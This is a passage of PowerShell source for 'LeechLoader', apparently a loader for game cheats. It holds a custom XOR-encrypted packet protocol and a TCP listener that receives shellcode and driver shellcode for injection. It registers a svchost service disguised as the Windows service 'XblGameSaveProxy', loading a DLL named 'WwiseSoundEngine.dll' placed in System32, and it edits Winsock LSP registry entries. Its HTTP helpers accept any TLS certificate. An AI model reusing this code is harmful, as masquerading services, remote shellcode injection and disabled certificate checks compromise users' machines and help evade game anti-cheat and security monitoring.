    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
    return Convert-BytesToHex $bytes
}

function Convert-HexToString {
    param([Parameter(Mandatory, Position = 0)][string]$Hex)
    $bytes = Convert-HexToBytes $Hex
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

function Test-HexString {
    param([Parameter(Mandatory, Position = 0)][string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return $false }
    if ($Text.Length % 2 -ne 0) { return $false }
    return $Text -match '^[0-9a-fA-F]+$'
}

function Remove-CrLf {
    param([Parameter(Mandatory, Position = 0)][string]$Text)
    return $Text.Trim("`r", "`n", " ")
}

function Get-Rand32 {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $buf = [byte[]]::new(4)
    $rng.GetBytes($buf)
    return [System.BitConverter]::ToUInt32($buf, 0)
}

function New-RandomID16 {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $buf = [byte[]]::new(16)
    $rng.GetBytes($buf)
    return ($buf | ForEach-Object { $_.ToString("X2") }) -join ""
}

function Invoke-EncryptRaw {
    param(
        [byte[]]$Plain,
        [string]$KeyHex
    )
    $Key = Convert-HexToBytes $KeyHex
    $KeyLen = $Key.Length
    $PlainLen = $Plain.Length
    $A = Get-Rand32
    $B = Get-Rand32
    [uint32]$AndValue = [uint32]((-bnot ($A -bxor $B)) -band 0xFFFFFFFF)
    $KeyTime = [System.BitConverter]::GetBytes([uint32]$B)
    $AndValueByte = [byte]($AndValue -band 0xFF)
    $TimeKey = [byte[]]::new(4)
    for ($i = 0; $i -lt 4; $i++) {
        $TimeKey[$i] = [byte]($KeyTime[$i] -bxor $AndValueByte)
    }
    [byte]$finalKeyXor = 0
    [uint32]$currentIdx = 0
    for ($i = 0; $i -lt $KeyLen; $i++) {
        if ($currentIdx -ge 4) { $currentIdx = 0 }
        $Key[$i] = [byte]($Key[$i] -bxor $KeyTime[$currentIdx])
        $finalKeyXor = [byte]($finalKeyXor -bxor $Key[$i])
        $currentIdx++
    }
    $out = [byte[]]::new(8 + $PlainLen)
    $aBytes = [System.BitConverter]::GetBytes([uint32]$A)
    $bBytes = [System.BitConverter]::GetBytes([uint32]$B)
    [System.Array]::Copy($aBytes, 0, $out, 0, 4)
    [System.Array]::Copy($bBytes, 0, $out, 4, 4)
    for ($i = 0; $i -lt $PlainLen; $i++) {
        if ($currentIdx -ge 4) { $currentIdx = 0 }
        $out[8 + $i] = [byte]($Plain[$i] -bxor $TimeKey[$currentIdx] -bxor $finalKeyXor)
        $currentIdx++
    }
    return $out
}

function Invoke-DecryptRaw {
    param(
        [byte[]]$Enc,
        [string]$KeyHex
    )
    if ($Enc.Length -lt 8) {
        throw "cipher too short (missing 8-byte header)"
    }
    $A = [System.BitConverter]::ToUInt32($Enc, 0)
    $B = [System.BitConverter]::ToUInt32($Enc, 4)
    [uint32]$AndValue = [uint32]((-bnot ($A -bxor $B)) -band 0xFFFFFFFF)
    $KeyTime = [System.BitConverter]::GetBytes([uint32]$B)
    $AndValueByte = [byte]($AndValue -band 0xFF)
    $TimeKey = [byte[]]::new(4)
    for ($i = 0; $i -lt 4; $i++) {
        $TimeKey[$i] = [byte]($KeyTime[$i] -bxor $AndValueByte)
    }
    $Key = Convert-HexToBytes $KeyHex
    $KeyLen = $Key.Length
    [byte]$finalKeyXor = 0
    for ($i = 0; $i -lt $KeyLen; $i++) {
        $Key[$i] = [byte]($Key[$i] -bxor $KeyTime[$i % 4])
        $finalKeyXor = [byte]($finalKeyXor -bxor $Key[$i])
    }
    [uint32]$idx = [uint32]($KeyLen % 4)
    $CtLen = $Enc.Length - 8
    $plain = [byte[]]::new($CtLen)
    for ($i = 0; $i -lt $CtLen; $i++) {
        if ($idx -ge 4) { $idx = 0 }
        $plain[$i] = [byte]($Enc[8 + $i] -bxor $finalKeyXor -bxor $TimeKey[$idx])
        $idx++
    }
    return $plain
}

function Invoke-EncryptDataHex {
    param([string]$PlainHex, [string]$KeyHex)
    $plain = Convert-HexToBytes $PlainHex
    $enc = Invoke-EncryptRaw -Plain $plain -KeyHex $KeyHex
    return Convert-BytesToHex $enc
}

function Invoke-DecryptDataHex {
    param([string]$EncHex, [string]$KeyHex)
    $enc = Convert-HexToBytes $EncHex
    $plain = Invoke-DecryptRaw -Enc $enc -KeyHex $KeyHex
    return Convert-BytesToHex $plain
}

function Invoke-XorDecryptHex {
    param([string]$InputHex, [string]$Key)
    $inputBytes = Convert-HexToBytes $InputHex
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $keyLen = $keyBytes.Length
    $out = [byte[]]::new($inputBytes.Length)
    for ($i = 0; $i -lt $inputBytes.Length; $i++) {
        $out[$i] = [byte]($inputBytes[$i] -bxor $keyBytes[$i % $keyLen])
    }
    return [System.Text.Encoding]::UTF8.GetString($out)
}

function New-Packet {
    param(
        [string]$Message,
        [string]$DynamicKey
    )
    [uint32]$MAGIC = 0x414C5448   # "HTLA"
    [uint16]$VERSION = 0x0001
    [uint16]$FLAGS = 0x0001
    $hexStr = Convert-StringToHex $Message
    $encryptedHex = Invoke-EncryptDataHex -PlainHex $hexStr -KeyHex $DynamicKey
    $body = Convert-HexToBytes $encryptedHex
    $header = [byte[]]::new(16)
    [System.BitConverter]::GetBytes([uint32]$MAGIC).CopyTo($header, 0)
    [System.BitConverter]::GetBytes([uint16]$VERSION).CopyTo($header, 4)
    [System.BitConverter]::GetBytes([uint16]$FLAGS).CopyTo($header, 6)
    [System.BitConverter]::GetBytes([uint32]$body.Length).CopyTo($header, 8)
    [System.BitConverter]::GetBytes([uint32]1).CopyTo($header, 12)
    $packet = [byte[]]::new($header.Length + $body.Length)
    [System.Array]::Copy($header, 0, $packet, 0, $header.Length)
    [System.Array]::Copy($body, 0, $packet, $header.Length, $body.Length)
    return $packet
}

function Read-Packet {
    param(
        [byte[]]$PacketBytes,
        [string]$DynamicKey
    )
    try {
        if ($PacketBytes.Length -lt 16) { return $null }
        [uint32]$MAGIC = 0x414C5448   # "HTLA"
        [uint16]$VERSION = 0x0001
        $magic = [System.BitConverter]::ToUInt32($PacketBytes, 0)
        $version = [System.BitConverter]::ToUInt16($PacketBytes, 4)
        $flags = [System.BitConverter]::ToUInt16($PacketBytes, 6)
        $bodySize = [System.BitConverter]::ToUInt32($PacketBytes, 8)
        if ($magic -ne $MAGIC) { return $null }
        if ($version -ne $VERSION) { return $null }
        if ($bodySize -eq 0 -or $bodySize -gt 100MB) { return $null }
        $body = [byte[]]::new($bodySize)
        [System.Array]::Copy($PacketBytes, 16, $body, 0, $bodySize)
        $encHex = Convert-BytesToHex $body
        $plainHex = Invoke-DecryptDataHex -EncHex $encHex -KeyHex $DynamicKey
        return Convert-HexToString $plainHex
    }
    catch {
        return $null
    }
}

# ==========================================
# LspUtils 模块函数
# ==========================================
$script:LSP_PROVIDER_GUID = [System.Guid]::new("d3c21122-85e1-48f3-9ab6-23d90c7307ef")

function Test-LspInstalled {
    try {
        $catalogKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64"
        if (-not (Test-Path $catalogKey)) {
            $catalogKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries"
        }
        $guidStr = $script:LSP_PROVIDER_GUID.ToString("B").ToUpper()
        $entries = Get-ChildItem $catalogKey -ErrorAction SilentlyContinue
        foreach ($entry in $entries) {
            $provider = Get-ItemProperty $entry.PSPath -Name "Provider_Id" -ErrorAction SilentlyContinue
            if ($provider -and $provider.Provider_Id -eq $guidStr) {
                return $true
            }
        }
        return $false
    }
    catch {
        return $false
    }
}

function Remove-LspProvider {
    Write-Warning "LSP Provider 卸载（WSCDeinstallProvider）在 Windows 8+ 已废弃"
    try {
        $guidStr = "{" + $script:LSP_PROVIDER_GUID.ToString().ToUpper() + "}"
        $catalogKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64"
        if (-not (Test-Path $catalogKey)) {
            $catalogKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries"
        }
        $entries = Get-ChildItem $catalogKey -ErrorAction SilentlyContinue
        $removed = 0
        foreach ($entry in $entries) {
            $provider = Get-ItemProperty $entry.PSPath -Name "Provider_Id" -ErrorAction SilentlyContinue
            if ($provider -and $provider.Provider_Id -eq $guidStr) {
                Remove-Item $entry.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                $removed++
            }
        }
        try {
            if ([System.Management.Automation.PSTypeName]'LeechLoader.LspAPI') {
                $guid = $script:LSP_PROVIDER_GUID
                $errno = 0
                [LeechLoader.LspAPI]::WSCDeinstallProvider([ref]$guid, [ref]$errno) | Out-Null
            }
        }
        catch {}
    }
    catch {}
}

function Install-LspProvider {
    param([string]$DllPath)
    Write-Warning "Install-LspProvider 在 Windows 8+ 已废弃且出于安全已跳过。"
    return $false
}

# ==========================================
# Network 网络连接函数
# ==========================================
function Invoke-HttpGet {
    param(
        [string]$Url,
        [switch]$SkipSslValidation = $true
    )
    try {
        if ($SkipSslValidation) {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        }
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.Method = "GET"
        $request.Timeout = 30000
        $request.UserAgent = "Mozilla/5.0"
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $reader = [System.IO.StreamReader]::new($stream, [System.Text.Encoding]::UTF8)
        $body = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        return $body
    }
    catch {
        return ""
    }
}

function Invoke-HttpPost {
    param(
        [string]$Url,
        [string]$Body
    )
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.Method = "POST"
        $request.Timeout = 30000
        $request.ContentType = "application/x-www-form-urlencoded"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $request.ContentLength = $bodyBytes.Length
        $reqStream = $request.GetRequestStream()
        $reqStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $reqStream.Close()
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $reader = [System.IO.StreamReader]::new($stream)
        $result = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        return $result
    }
    catch {
        return ""
    }
}

function Test-PortInUse {
    param([int]$Port)
    try {
        $props = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
        $listeners = $props.GetActiveTcpListeners()
        foreach ($ep in $listeners) {
            if ($ep.Port -eq $Port) { return $true }
        }
    }
    catch {}
    return $false
}

function Find-UnusedPort {
    param([int]$StartPort = 10010)
    $rng = [System.Random]::new()
    for ($i = 0; $i -lt 500; $i++) {
        $port = $rng.Next($StartPort, 65535)
        if (-not (Test-PortInUse $port)) { return $port }
    }
    for ($port = $StartPort; $port -lt 65535; $port++) {
        if (-not (Test-PortInUse $port)) { return $port }
    }
    return 0
}

function Get-TagValue {
    param([string]$Text, [string]$Tag)
    $open = "[$Tag]"
    $close = "[/$Tag]"
    $start = $Text.IndexOf($open)
    if ($start -lt 0) { return "" }
    $start += $open.Length
    $end = $Text.IndexOf($close, $start)
    if ($end -lt 0) { return "" }
    return $Text.Substring($start, $end - $start)
}

function Read-ExactBytes {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [int]$Count
    )
    $buf = [byte[]]::new($Count)
    $received = 0
    while ($received -lt $Count) {
        $n = $Stream.Read($buf, $received, $Count - $received)
        if ($n -le 0) { return $null }
        $received += $n
    }
    return $buf
}

function Write-AllBytes {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [byte[]]$Data
    )
    try {
        $Stream.Write($Data, 0, $Data.Length)
        return $true
    }
    catch {
        return $false
    }
}

function Send-EncryptedPacket {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [string]$Message,
        [string]$DynamicKey
    )
    try {
        $packet = New-Packet -Message $Message -DynamicKey $DynamicKey
        return Write-AllBytes -Stream $Stream -Data $packet
    }
    catch {
        return $false
    }
}

function Invoke-HandleClient {
    param(
        [System.Net.Sockets.TcpClient]$Client,
        [hashtable]$GlobalState
    )
    $stream = $null
    try {
        $stream = $Client.GetStream()
        $stream.ReadTimeout = 60000
        $stream.WriteTimeout = 5000
        $headerBytes = Read-ExactBytes -Stream $stream -Count 16
        if ($null -eq $headerBytes) { return }
        $magic = [System.BitConverter]::ToUInt32($headerBytes, 0)
        $version = [System.BitConverter]::ToUInt16($headerBytes, 4)
        $flags = [System.BitConverter]::ToUInt16($headerBytes, 6)
        $bodySize = [System.BitConverter]::ToUInt32($headerBytes, 8)
        $PACKET_MAGIC = [uint32]0x414C5448
        $PACKET_VERSION = [uint16]0x0001
        if ($magic -ne $PACKET_MAGIC -or $version -ne $PACKET_VERSION -or
            $bodySize -eq 0 -or $bodySize -gt 100MB) {
            Write-ConsoleLog (Get-L10N "auth.data_error") 0
            return
        }
        $body = Read-ExactBytes -Stream $stream -Count ([int]$bodySize)
        if ($null -eq $body) { return }
        $encHex = Convert-BytesToHex $body
        $plainHex = Invoke-DecryptDataHex -EncHex $encHex -KeyHex $GlobalState.DynamicKey
        $params = Convert-HexToString $plainHex
        if ([string]::IsNullOrEmpty($params)) { return } 
        $type = Get-TagValue -Text $params -Tag "TYPE"
        if ([string]::IsNullOrEmpty($type)) {
            Write-ConsoleLog (Get-L10N "auth.data_error") 0
            $resp = "[TYPE]Login[/TYPE][RESULT]err[/RESULT][REASON]data.error[/REASON]"
            Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
            return
        }

        switch ($type) {
            "Login" {
                $cardKey = Get-TagValue -Text $params -Tag "CARDKEY"
                $hwid = Get-TagValue -Text $params -Tag "HWID"
                $appVersion = Get-TagValue -Text $params -Tag "APPVERSION"
                $connectMode = Get-TagValue -Text $params -Tag "CONNECTMODE"
                $connectPort = Get-TagValue -Text $params -Tag "CONNECTPORT"
                $GlobalState.CardKey = $cardKey
                $GlobalState.ClientSignature = $hwid
                $GlobalState.AppVersion = $appVersion
                $GlobalState.ConnectionPort = $connectPort
                if ([int]$connectMode -ne $GlobalState.ConnectionMode) {
                    Write-ConsoleLog (Get-L10N "auth.connect_mode_fail") 0
                    $resp = "[TYPE]Login[/TYPE][RESULT]err[/RESULT][REASON]$(Get-L10N 'auth.connect_mode_fail')[/REASON]"
                    Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                    return
                }
                if ([string]::IsNullOrEmpty($connectPort) -or $connectPort -eq "0") {
                    Write-ConsoleLog (Get-L10N "auth.connect_mode_fail") 0
                    $resp = "[TYPE]Login[/TYPE][RESULT]err[/RESULT][REASON]$(Get-L10N 'auth.connect_mode_fail')[/REASON]"
                    Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                    return
                }
                if ($GlobalState.ConnectionMode -eq 4) {
                    if (-not (Test-UsbDeviceMI05)) {
                        Write-ConsoleLog (Get-L10N "auth.usb_discover_fail") 0
                        $resp = "[TYPE]Login[/TYPE][RESULT]err[/RESULT][REASON]$(Get-L10N 'auth.usb_discover_fail')[/REASON]"
                        Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                        return
                    }
                }

                Write-ConsoleLog (Get-L10N "auth.deployed_success") 1
                $resp = "[TYPE]Login[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                $GlobalState.IsLogged = $true
            }
            "Close_Loader" {
                Write-ConsoleLog (Get-L10N "system.preparing_close") 1
                $resp = "[TYPE]Close_Loader[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                Start-Sleep -Seconds 2
                Stop-CurrentProcess
            }
            "MANUAL_TCP_CONNECT" {
                $clientIp = $Client.Client.RemoteEndPoint.Address.ToString()
                $GlobalState.ClientIP = $clientIp
                $resp = "[TYPE]MANUAL_TCP_CONNECT[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
            }
            "Leech2Loader_Service" {
                Write-ConsoleLog (Get-L10N "service.dual_started") 1
                $resp = "[TYPE]Leech2Loader_Service[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                $GlobalState.LeechStarted = $true
            }
            "Leech2Loader_GetPort" {
                $resp = "[TYPE]Leech2Loader_GetPort[/TYPE][RESULT]ok[/RESULT][REASON]$($GlobalState.ConnectionPort)[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                $GlobalState.LeechStarted = $true
            }
            "Leech2Loader_GetConnectMode" {
                $resp = "[TYPE]Leech2Loader_GetConnectMode[/TYPE][RESULT]ok[/RESULT][MODE]$($GlobalState.ConnectionMode)[/MODE]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
            }
            "Leech2Loader_Auth" {
                $resp = "[TYPE]Leech2Loader_Auth[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                $GlobalState.LeechAuthed = $true
            }
            "Game_Shellcode" {
                $GlobalState.GameShellcodeHex = Get-TagValue -Text $params -Tag "SHELLCODE"
                $GlobalState.ShellcodeExtraData = Get-TagValue -Text $params -Tag "EXTRA_DATA"
                $GlobalState.GameShellcodeReady = $true
                Write-ConsoleLog (Get-L10N "deploy.program_data") 1
                $resp = "[TYPE]Game_Shellcode[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
            }
            "Leech_Shellcode" {
                $GlobalState.LeechShellcodeHex = Get-TagValue -Text $params -Tag "SHELLCODE"
                $resp = "[TYPE]Game_Shellcode[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                Write-ConsoleLog (Get-L10N "deploy.dual_data1") 1
            }
            "Leech_Driver_Shellcode" {
                $GlobalState.LeechDriverShellcodeHex = Get-TagValue -Text $params -Tag "SHELLCODE"
                $GlobalState.LeechShellcodeReady = $true
                $resp = "[TYPE]Leech_Driver_Shellcode[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                Write-ConsoleLog (Get-L10N "deploy.dual_data2") 1
            }
            "Leech_Connect" {
                $leechRunMode = Get-TagValue -Text $params -Tag "LEECH_RUN_MODE"
                $runMode = 2
                $failReason = ""
                $ok = Invoke-RunLeech -GlobalState $GlobalState -StartMode $runMode -FailReason ([ref]$failReason)
                if (-not $ok) {
                    if ([string]::IsNullOrEmpty($failReason)) {
                        $failReason = Get-L10N "leech.inject_fail"
                    }
                    $resp = "[TYPE]Leech_Connect[/TYPE][RESULT]err[/RESULT][REASON]$failReason[/REASON]"
                    Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
                    return
                }
                $waitCount = 0
                while (-not $GlobalState.LeechStarted -and $waitCount -lt 300) {
                    Start-Sleep -Milliseconds 100
                    $waitCount++
                }
                $resp = "[TYPE]Leech_Connect[/TYPE][RESULT]ok[/RESULT][REASON]success[/REASON]"
                Send-EncryptedPacket -Stream $stream -Message $resp -DynamicKey $GlobalState.DynamicKey | Out-Null
            }
        }
    }
    catch {}
    finally {
        if ($null -ne $stream) { try { $stream.Close() } catch {} }
        try { $Client.Close() } catch {}
    }
}

function Start-UdpDiscovery {
    param([hashtable]$GlobalState)
    $DISCOVER_PORT = 10000
    Write-ConsoleLog (Get-L10N "device.waiting_discovery") 2
    [LeechLoader.UdpDiscovery]::Start($DISCOVER_PORT)
}

function Start-TcpServer {
    param(
        [hashtable]$GlobalState
    )
    $AUTH_PORT = 10004
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $AUTH_PORT)
    try {
        $listener.Start(5)
        Write-ConsoleLog (Get-L10N "deploy.host_success") 1
        
        # 启动后台 UDP 发现广播服务（纯 C# 线程池实现，安全不崩溃）
        Start-UdpDiscovery -GlobalState $GlobalState



        # 轮询接收并应答，支持多轮交互，同时同步 UDP 发现状态
        while ($true) {
            # 1. 检查是否有后台 UDP 发现广播捕获的新副机 IP
            $discoveredIP = [LeechLoader.UdpDiscovery]::DiscoveredIP
            if (-not [string]::IsNullOrEmpty($discoveredIP) -and $discoveredIP -ne $GlobalState.ClientIP) {
                $GlobalState.ClientIP = $discoveredIP
                Write-ConsoleLog "$(Get-L10N 'device.secondary_prefix')$discoveredIP$(Get-L10N 'device.discovered_suffix')" 1
            }

            # 2. 非阻塞检查 TCP 挂起连接，确保主线程不卡死并能实时响应 UDP 状态变化
            if ($listener.Pending()) {
                try {
                    $client = $listener.AcceptTcpClient()
                    if ($null -ne $client) {
                        # 同步处理客户端请求，在单会话内安全不崩溃地交换数据
                        Invoke-HandleClient -Client $client -GlobalState $GlobalState
                    }
                }
                catch [System.Net.Sockets.SocketException] {
                    Start-Sleep -Milliseconds 50
                }
                catch {
                    Write-ConsoleLog "TCP 客户端接收处理异常: $_" 0
                }
            }
            else {
                Start-Sleep -Milliseconds 100
            }
        }
    }
    finally { 
        $listener.Stop() 
        [LeechLoader.UdpDiscovery]::Stop()
    }
}

function Test-UsbDeviceMI05 {
    try {
        $devices = Get-PnpDevice -ErrorAction SilentlyContinue | Where-Object {
            $_.Status -eq 'OK' -and $_.InstanceId -match 'MI_05'
        }
        return ($null -ne $devices -and @($devices).Count -gt 0)
    }
    catch {
        try {
            $wmi = Get-WmiObject -Class Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.PNPDeviceID -match 'MI_05' }
            return ($null -ne $wmi)
        }
        catch { return $false }
    }
}



function Get-Announcements {
    param(
        [string]$StaticKey,
        [string]$ApiUrl
    )
    $result = @{ announcement = ""; dynamic_key = ""; version = ""; wechat = "0"; report = "0"; result = "0" }
    try {
        $url = "$ApiUrl/api/setting/cheat/announcement"
        $response = Invoke-HttpGet $url
        $response = Remove-CrLf $response
        if (Test-HexString $response) {
            $decrypted = Invoke-XorDecryptHex -InputHex $response -Key $StaticKey
            $json = $decrypted | ConvertFrom-Json -ErrorAction SilentlyContinue
            if ($json) {
                $result.announcement = $json.announcement
                $result.dynamic_key = $json.dynamic_key
                $result.version = $json.version
                $result.wechat = $json.wechat
                $result.report = $json.report
                $result.result = $json.result
            }
        }
    }
    catch {}
    return $result
}

# ==========================================
# Service 系统服务管理函数
# ==========================================
function Remove-WindowsServiceEx {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ServiceName,
        [int]$MaxWaitMs = 3000
    )
    $SC_MANAGER_ALL_ACCESS = 0xF003F
    $SERVICE_STOP = 0x0020
    $SERVICE_QUERY_STATUS = 0x0004
    $SERVICE_DELETE = 0x10000
    $SERVICE_STOPPED = 0x00000001
    $SERVICE_CONTROL_STOP = 0x00000001

    $hSCM = [LeechLoader.WinAPI]::OpenSCManagerW($null, $null, [uint32]$SC_MANAGER_ALL_ACCESS)
    if ($hSCM -eq [IntPtr]::Zero) { return $false }
    try {
        $accessMask = [uint32]($SERVICE_STOP -bor $SERVICE_QUERY_STATUS -bor $SERVICE_DELETE)
        $hSvc = [LeechLoader.WinAPI]::OpenServiceW($hSCM, $ServiceName, $accessMask)
        if ($hSvc -eq [IntPtr]::Zero) { return $true }
        try {
            $svcStatus = New-Object LeechLoader.SERVICE_STATUS
            [LeechLoader.WinAPI]::ControlService($hSvc, [uint32]$SERVICE_CONTROL_STOP, [ref]$svcStatus) | Out-Null
            $waited = 0
            $interval = 100
            while ($waited -lt $MaxWaitMs) {
                Start-Sleep -Milliseconds $interval
                $waited += $interval
                $svcStatus = New-Object LeechLoader.SERVICE_STATUS
                if ([LeechLoader.WinAPI]::QueryServiceStatus($hSvc, [ref]$svcStatus) -and
                    $svcStatus.dwCurrentState -eq [uint32]$SERVICE_STOPPED) { break }
            }
            $deleted = [LeechLoader.WinAPI]::DeleteService($hSvc)
            if ($deleted) { Start-Sleep -Milliseconds 200 }
            return $deleted
        }
        finally { [LeechLoader.WinAPI]::CloseServiceHandle($hSvc) | Out-Null }
    }
    finally { [LeechLoader.WinAPI]::CloseServiceHandle($hSCM) | Out-Null }
}

function New-SvchostService {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ServiceName,
        [Parameter(Mandatory)]
        [string]$DisplayName,
        [Parameter(Mandatory)]
        [string]$ServiceDllPath,
        [string]$BinPath = "%SystemRoot%\System32\svchost.exe -k netsvcs"
    )
    $SC_MANAGER_CREATE_SERVICE = 0x0002
    $SERVICE_ALL_ACCESS = 0xF01FF
    $SERVICE_WIN32_SHARE_PROCESS = 0x00000020
    $SERVICE_DEMAND_START = 0x00000003
    $SERVICE_ERROR_IGNORE = 0x00000000
    Remove-WindowsServiceEx -ServiceName $ServiceName | Out-Null
    $hSCM = [LeechLoader.WinAPI]::OpenSCManagerW($null, $null, [uint32]$SC_MANAGER_CREATE_SERVICE)
    if ($hSCM -eq [IntPtr]::Zero) { return $false }
    try {
        $hSvc = [LeechLoader.WinAPI]::CreateServiceW(
            $hSCM, $ServiceName, $DisplayName, [uint32]$SERVICE_ALL_ACCESS,
            [uint32]$SERVICE_WIN32_SHARE_PROCESS, [uint32]$SERVICE_DEMAND_START,
            [uint32]$SERVICE_ERROR_IGNORE, $BinPath, $null, [IntPtr]::Zero, $null, $null, $null)
        if ($hSvc -eq [IntPtr]::Zero) { return $false }
        try {
            $regPath = "SYSTEM\CurrentControlSet\Services\$ServiceName\Parameters"
            Set-HklmExpandSz -SubKey $regPath -ValueName "ServiceDll" -Value $ServiceDllPath | Out-Null
            Set-HklmDword -SubKey $regPath -ValueName "ServiceDllUnloadOnStop" -Value 1 | Out-Null
            [LeechLoader.WinAPI]::StartServiceW($hSvc, 0, [IntPtr]::Zero) | Out-Null
            return $true
        }
        finally { [LeechLoader.WinAPI]::CloseServiceHandle($hSvc) | Out-Null }
    }
    finally { [LeechLoader.WinAPI]::CloseServiceHandle($hSCM) | Out-Null }
}

function Test-ServiceExists {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$ServiceName)
    $SC_MANAGER_CONNECT = 0x0001
    $SERVICE_QUERY_STATUS = 0x0004
    $hSCM = [LeechLoader.WinAPI]::OpenSCManagerW($null, $null, [uint32]$SC_MANAGER_CONNECT)
    if ($hSCM -eq [IntPtr]::Zero) { return $false }
    try {
        $hSvc = [LeechLoader.WinAPI]::OpenServiceW($hSCM, $ServiceName, [uint32]$SERVICE_QUERY_STATUS)
        if ($hSvc -eq [IntPtr]::Zero) { return $false }
        [LeechLoader.WinAPI]::CloseServiceHandle($hSvc) | Out-Null
        return $true
    }
    finally { [LeechLoader.WinAPI]::CloseServiceHandle($hSCM) | Out-Null }
}

function Test-ServiceRunning {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$ServiceName)
    try {
        $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        return ($null -ne $svc -and $svc.Status -eq 'Running')
    }
    catch { return $false }
}

function Get-FileMD5Hex {
    [CmdletBinding()]
    param([string]$FilePath = $PSCommandPath)
    try {
        $md5 = [System.Security.Cryptography.MD5]::Create()
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $hash = $md5.ComputeHash($bytes)
        return ($hash | ForEach-Object { $_.ToString("x2") }) -join ""
    }
    catch { return "" }
}

function Test-HostAlreadyInstalled {
    if (Test-ServiceExists "XblGameSaveProxy") { return $true }
    $sysDir = [LeechLoader.WinAPIHelper]::GetSystemDirectory()
    $wwisePath = [System.IO.Path]::Combine($sysDir, "WwiseSoundEngine.dll")
    if (Test-Path $wwisePath) { return $true }
    if (Test-LspInstalled) { return $true }
    return $false
}

function Invoke-UninstallHost {
    Remove-WindowsServiceEx "XblGameSaveProxy" | Out-Null
    Remove-LspProvider
    $sysDir = [LeechLoader.WinAPIHelper]::GetSystemDirectory()
    $wwisePath = [System.IO.Path]::Combine($sysDir, "WwiseSoundEngine.dll")
    if (Test-Path $wwisePath) {
        try { Remove-Item $wwisePath -Force -ErrorAction SilentlyContinue } catch {}
    }
    Write-ConsoleLog (Get-L10N "service.host_uninstalled") 1
}

# ==========================================
# Injection 注入调度函数
# ==========================================
function Write-BinaryFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$TargetDir,
        [Parameter(Mandatory)][string]$FileName,
        [Parameter(Mandatory)][byte[]]$Data
    )
    try {
        if (-not (Test-Path $TargetDir)) { New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null }
        $fullPath = [System.IO.Path]::Combine($TargetDir, $FileName)
        [System.IO.File]::WriteAllBytes($fullPath, $Data)
        return $fullPath
    }
    catch { return "" }
}

function Test-FileInUse {
